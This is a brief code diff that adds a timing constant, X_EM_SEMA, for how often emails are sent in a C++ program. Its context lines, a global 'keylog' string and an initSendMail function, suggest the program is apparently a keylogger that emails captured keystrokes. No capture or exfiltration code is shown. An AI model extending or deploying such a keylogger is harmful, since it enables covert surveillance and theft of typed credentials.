@@ -9,6 +9,13 @@
 #include "Timer.h"
 #include "Sender.h"
 
+/*
+*   X_EM_SEMA   :   Time interval for sending emails. It should be mentioned in milliseconds.
+*                   Default value is 30000 which means 30 seconds
+*/
+
+#define X_EM_SEMA 30000
+
 std::string keylog = "";
 
 void initSendMail()
